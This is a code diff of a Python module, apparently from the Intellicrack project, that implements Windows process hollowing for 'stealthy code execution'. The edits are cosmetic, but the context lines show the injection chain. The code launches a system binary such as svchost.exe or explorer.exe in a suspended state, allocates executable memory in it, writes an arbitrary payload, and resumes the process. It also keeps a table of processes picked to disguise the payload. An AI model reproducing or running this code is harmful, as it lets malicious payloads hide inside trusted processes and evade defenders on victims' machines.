@@ -1,5 +1,4 @@
-"""
-This file is part of Intellicrack.
+"""This file is part of Intellicrack.
 Copyright (C) 2025 Zachary Flint
 
 This program is free software: you can redistribute it and/or modify
@@ -19,7 +18,7 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.
 import ctypes
 import logging
 import struct
-from typing import Any, Dict, Optional, Tuple
+from typing import Any
 
 from ...utils.system.windows_common import WindowsConstants
 
@@ -39,6 +38,7 @@ except ImportError as e:
     # Create mock for non-Windows platforms
     class MockWintypes:
         """Mock wintypes implementation for non-Windows platforms."""
+
         DWORD = ctypes.c_ulong
         LPWSTR = ctypes.c_wchar_p
         WORD = ctypes.c_ushort
@@ -51,6 +51,7 @@ except ImportError as e:
 # Windows structures for process hollowing
 class STARTUPINFO(ctypes.Structure):
     """Windows STARTUPINFO structure."""
+
     _fields_ = [
         ("cb", ctypes.wintypes.DWORD),
         ("lpReserved", ctypes.wintypes.LPWSTR),
@@ -69,22 +70,24 @@ class STARTUPINFO(ctypes.Structure):
         ("lpReserved2", ctypes.wintypes.LPVOID),
         ("hStdInput", ctypes.wintypes.HANDLE),
         ("hStdOutput", ctypes.wintypes.HANDLE),
-        ("hStdError", ctypes.wintypes.HANDLE)
+        ("hStdError", ctypes.wintypes.HANDLE),
     ]
 
 
 class PROCESS_INFORMATION(ctypes.Structure):
     """Windows PROCESS_INFORMATION structure."""
+
     _fields_ = [
         ("hProcess", ctypes.wintypes.HANDLE),
         ("hThread", ctypes.wintypes.HANDLE),
         ("dwProcessId", ctypes.wintypes.DWORD),
-        ("dwThreadId", ctypes.wintypes.DWORD)
+        ("dwThreadId", ctypes.wintypes.DWORD),
     ]
 
 
 class CONTEXT(ctypes.Structure):
     """Windows CONTEXT structure for x86."""
+
     _fields_ = [
         ("ContextFlags", ctypes.c_ulong),
         ("Dr0", ctypes.c_ulong),
@@ -110,7 +113,7 @@ class CONTEXT(ctypes.Structure):
         ("EFlags", ctypes.c_ulong),
         ("Esp", ctypes.c_ulong),
         ("SegSs", ctypes.c_ulong),
-        ("ExtendedRegisters", ctypes.c_byte * 512)
+        ("ExtendedRegisters", ctypes.c_byte * 512),
     ]
 
 
@@ -119,8 +122,7 @@ CONTEXT_FULL = 0x10007
 
 
 class ProcessHollowing:
-    """
-    Process hollowing implementation for stealthy code execution.
+    """Process hollowing implementation for stealthy code execution.
     """
 
     def __init__(self):
@@ -130,36 +132,35 @@ class ProcessHollowing:
             "svchost.exe": {
                 "path": "C:\\\\Windows\\\\System32\\\\svchost.exe",
                 "args": "-k netsvcs",
-                "suitable_for": ["service", "network"]
+                "suitable_for": ["service", "network"],
             },
             "explorer.exe": {
                 "path": "C:\\\\Windows\\\\explorer.exe",
                 "args": "",
-                "suitable_for": ["gui", "user_interaction"]
+                "suitable_for": ["gui", "user_interaction"],
             },
             "notepad.exe": {
                 "path": "C:\\\\Windows\\\\System32\\\\notepad.exe",
                 "args": "",
-                "suitable_for": ["simple", "test"]
+                "suitable_for": ["simple", "test"],
             },
             "calc.exe": {
                 "path": "C:\\\\Windows\\\\System32\\\\calc.exe",
                 "args": "",
-                "suitable_for": ["simple", "test"]
+                "suitable_for": ["simple", "test"],
             },
             "dllhost.exe": {
                 "path": "C:\\\\Windows\\\\System32\\\\dllhost.exe",
                 "args": "/Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}",
-                "suitable_for": ["com", "background"]
-            }
+                "suitable_for": ["com", "background"],
+            },
         }
 
     def hollow_process(self,
                       target_process: str,
                       payload: bytes,
-                      payload_entry_point: int = 0) -> Tuple[bool, Dict[str, Any]]:
-        """
-        Perform process hollowing.
+                      payload_entry_point: int = 0) -> tuple[bool, dict[str, Any]]:
+        """Perform process hollowing.
 
         Args:
             target_process: Target process to hollow
@@ -168,13 +169,14 @@ class ProcessHollowing:
 
         Returns:
             Success status and details
+
         """
         result = {
             "success": False,
             "pid": 0,
             "base_address": 0,
             "entry_point": 0,
-            "error": None
+            "error": None,
         }
 
         try:
@@ -247,7 +249,7 @@ class ProcessHollowing:
 
         return True
 
-    def _create_suspended_process(self, path: str, args: str) -> Optional[Dict[str, Any]]:
+    def _create_suspended_process(self, path: str, args: str) -> dict[str, Any] | None:
         """Create a suspended process."""
         try:
             import platform
@@ -276,7 +278,7 @@ class ProcessHollowing:
                 None,  # lpEnvironment
                 None,  # lpCurrentDirectory
                 ctypes.byref(si),  # lpStartupInfo
-                ctypes.byref(pi)  # lpProcessInformation
+                ctypes.byref(pi),  # lpProcessInformation
             )
 
             if success:
@@ -284,7 +286,7 @@ class ProcessHollowing:
                     "process_handle": pi.hProcess,
                     "thread_handle": pi.hThread,
                     "pid": pi.dwProcessId,
-                    "tid": pi.dwThreadId
+                    "tid": pi.dwThreadId,
                 }
 
         except Exception as e:
@@ -293,7 +295,7 @@ class ProcessHollowing:
         return None
 
     def _perform_hollowing(self,
-                          process_info: Dict[str, Any],
+                          process_info: dict[str, Any],
                           payload: bytes,
                           entry_point_offset: int) -> bool:
         """Perform the actual hollowing operation."""
@@ -342,7 +344,7 @@ class ProcessHollowing:
                 None,
                 image_size,
                 WindowsConstants.MEM_COMMIT | WindowsConstants.MEM_RESERVE,
-                WindowsConstants.PAGE_EXECUTE_READWRITE
+                WindowsConstants.PAGE_EXECUTE_READWRITE,
             )
 
             if not new_image_base:
@@ -356,7 +358,7 @@ class ProcessHollowing:
                 new_image_base,
                 payload,
                 len(payload),
-                ctypes.byref(bytes_written)
+                ctypes.byref(bytes_written),
             ):
                 self.logger.error("Failed to write payload to target process")
                 return False
@@ -381,7 +383,7 @@ class ProcessHollowing:
             self.logger.error(f"Hollowing operation failed: {e}")
             return False
 
-    def _resume_process(self, process_info: Dict[str, Any]) -> bool:
+    def _resume_process(self, process_info: dict[str, Any]) -> bool:
         """Resume the hollowed process."""
         try:
             import platform
@@ -397,7 +399,7 @@ class ProcessHollowing:
             self.logger.error(f"Failed to resume process: {e}")
             return False
 
-    def _terminate_process(self, process_info: Dict[str, Any]) -> bool:
+    def _terminate_process(self, process_info: dict[str, Any]) -> bool:
         """Terminate a process."""
         try:
             import platform
